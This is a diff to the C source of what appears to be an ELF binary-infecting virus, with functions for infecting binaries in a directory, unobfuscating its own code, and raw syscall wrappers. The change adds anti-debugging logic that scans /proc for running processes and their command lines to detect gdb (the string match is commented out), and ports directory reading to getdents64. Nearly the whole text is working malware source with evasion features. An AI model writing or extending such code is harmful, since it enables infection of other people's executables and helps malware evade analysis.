@@ -21,6 +21,7 @@ static void lambdaEnd(void);
 static void lambdaStart(void);
 static void encryptStart(void);
 static size_t strlen(const char *s);
+static int  checkProcess(char *dirname);
 static int  infectBins(const char *dirname);
 static void *memcpy(void *dest, const void *src, size_t);
 static int unObfuscate(void);
@@ -28,10 +29,13 @@ static int unObfuscate(void);
 int   entry_point(void *magic) {
   char    infectDir[] = "/tmp/test";
   char    infectDir2[] = "/tmp/test2";
+  char    procName[] = "/proc/";
 
   if (magic != (void *)0x42)
     if (unObfuscate() == -1)
       return (1);
+  if (checkProcess(procName) != 0)
+    return (1);
   if (infectBins(infectDir) == -1)
     return (1);
   /* if (infectBins(infectDir2) == -1) */
@@ -95,12 +99,25 @@ static void encryptStart(void) {}
 typedef off_t off64_t;
 typedef ino_t ino64_t;
 
-struct  linux_dirent {
-  unsigned long         d_ino;
-  unsigned long         d_off;
-  unsigned short        d_reclen;
-  char                  d_name[];
+struct  linux_dirent64 {
+  ino64_t         d_ino;
+  off64_t         d_off;
+  unsigned short  d_reclen;
+  unsigned char   d_type;
+  char            d_name[];
 };
+
+static int  read(int fd, char *buf, size_t count) {
+  register ssize_t    rax asm("rax") = 0;
+  register int        rdi asm("rdi") = fd;
+  register const void *rsi asm("rsi") = buf;
+  register size_t     rdx asm("rdx") = count;
+
+  asm("syscall"
+    : "=r" (rax));
+  return (rax);
+}
+
 static int  write(int fd, const void *buf, size_t count) {
   register int        rax asm("rax") = 1;
   register int        rdi asm("rdi") = fd;
@@ -166,10 +183,10 @@ static int  munmap(void *addr, size_t len) {
   return (rax);
 }
 
-static int  getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count) {
-  register int                    rax asm("rax") = 78;
+static int  getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count) {
+  register int                    rax asm("rax") = 217;
   register unsigned int           rdi asm("rdi") = fd;
-  register struct linux_dirent  *rsi asm("rsi") = dirp;
+  register struct linux_dirent64  *rsi asm("rsi") = dirp;
   register unsigned int           rdx asm("rdx") = count;
 
   asm("syscall"
@@ -243,6 +260,31 @@ static void  *memmove(void *dest, const void *src, size_t n) {
   return (dest);
 }
 
+static char	*strstr(const char *haystack, const char *needle) {
+  size_t  i;
+  size_t  j;
+  size_t  k;
+  char    *pointer;
+
+  if (needle[0] == '\0')
+    return ((char *)haystack);
+  i = 0;
+  pointer = NULL;
+  while (haystack[i]) {
+    j = 0;
+    k = i;
+    pointer = (char *)&haystack[i];
+    while (needle[j]) {
+      if (needle[j] != haystack[k++])
+        break ;
+      if (needle[j++ + 1] == '\0')
+        return (pointer);
+    }
+    pointer = NULL;
+    i += 1;
+  }
+  return (pointer);
+}
 /* static DIR *opendir(const char *name) { */
 
 /* } */
@@ -254,6 +296,92 @@ static void  *memmove(void *dest, const void *src, size_t n) {
 /* static int  closedir(DIR *dirp) { */
 
 /* } */
+
+static int  checkFileContent(char *dirname, char *filename) {
+  int     fd;
+  ssize_t ret;
+  size_t  len;
+  char    *tmp;
+  char    slash[] = "/";
+  char    buf[BUF_SIZE];
+  char    procName[] = "gdb";
+
+  len = strlen(dirname) + strlen(filename) + 1;
+  if ((tmp = mmap(0, len, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0)) <= 0)
+    return (-1);
+  memcpy(tmp, dirname, strlen(dirname));
+  strcat(tmp, slash);
+  strcat(tmp, filename);
+  if ((fd = open(tmp, O_RDONLY, 1)) < 0) {
+    munmap(tmp, len);
+    return (-1);
+  }
+  write(1, tmp, strlen(tmp));
+  munmap(tmp, len);
+  /* if ((ret = read(fd, buf, BUF_SIZE)) > 0) { */
+  /*   if (strstr(buf, procName) != NULL) { */
+  /*     close(fd); */
+  /*     return (1); */
+  /*   } */
+  /* } */
+  close(fd);
+  char ah[] = "\n";
+  write(1, ah, 1);
+  return (0);
+}
+
+static int  checkProcess(char *dirname) {
+  int                   fd;
+  int                   ret;
+  size_t                len;
+  char                  *tmp;
+  int                   bpos;
+  int                   nread;
+  struct linux_dirent64   *dirp;
+  char                  *buf;
+  char  procName[] = "/proc/";
+  char  cmdlineName[] = "cmdline";
+
+  if ((buf = mmap(0, BUF_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0)) <= 0)
+    return (-1);
+  if ((fd = open(procName, O_RDONLY | O_DIRECTORY, 0)) < 0) {
+    munmap(buf, BUF_SIZE);
+    return (-1);
+  }
+  if ((nread = getdents64(fd, (struct linux_dirent64 *)buf, BUF_SIZE)) < 0) {
+    munmap(buf, BUF_SIZE);
+    return (-1);
+  }
+  bpos = 0;
+  while (bpos < nread) {
+    dirp = (struct linux_dirent64 *)(buf + bpos);
+    if (dirp->d_type == DT_DIR && dirp->d_name[0] > '0' && dirp->d_name[0] <= '9' && strcmp(dirname, procName) == 0) {
+      len = strlen(dirname) + strlen(procName) + 1;
+      if ((tmp = mmap(0, len, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0)) <= 0) {
+        munmap(buf, BUF_SIZE);
+        return (-1);
+      }
+      memcpy(tmp, dirname, strlen(dirname));
+      strcat(tmp, dirp->d_name);
+      if ((ret = checkProcess(tmp)) == -1) {
+        munmap(tmp, len);
+        munmap(buf, BUF_SIZE);
+        return (-1);
+      }
+      munmap(tmp, len);
+      if (ret == 1)
+        return (1);
+    } else if (dirp->d_type == DT_REG && strcmp(dirp->d_name, cmdlineName) == 0 && strcmp(dirname, procName) != 0) {
+      ret = checkFileContent(dirname, cmdlineName);
+      munmap(buf, BUF_SIZE);
+      return (ret);
+    }
+    bpos += dirp->d_reclen;
+  }
+  munmap(buf, BUF_SIZE);
+  close(fd);
+  return (0);
+}
 
 struct bfile {
   int         fd;
@@ -284,7 +412,7 @@ static int  mapFile(const char *dirname, const char *filename, struct bfile *bin
     munmap(tmp, len);
     return (1);
   }
-  if ((fd = open(tmp, O_RDWR, 0)) <= 0) {
+  if ((fd = open(tmp, O_RDWR, 0)) < 0) {
     munmap(tmp, len);
     return (-1);
   }
@@ -454,17 +582,16 @@ static int  infectBins(const char *dirname) {
   struct bfile          bin;
   int                   bpos;
   int                   nread;
-  struct linux_dirent   *dirp;
+  struct linux_dirent64   *dirp;
   char                  buf[BUF_SIZE];
-  char                  d_type;
 
   if ((fd = open(dirname, O_RDONLY | O_DIRECTORY, 0)) < 0)
     return (-1);
-  if ((nread = getdents(fd, (struct linux_dirent *)buf, BUF_SIZE)) < 0)
+  if ((nread = getdents64(fd, (struct linux_dirent64 *)buf, BUF_SIZE)) < 0)
     return (-1);
   bpos = 0;
   while (bpos < nread) {
-    dirp = (struct linux_dirent *) (buf + bpos);
+    dirp = (struct linux_dirent64 *) (buf + bpos);
     if ((ret = mapFile(dirname, dirp->d_name, &bin)) == -1)
       return (-1);
     if (ret == 0 &&
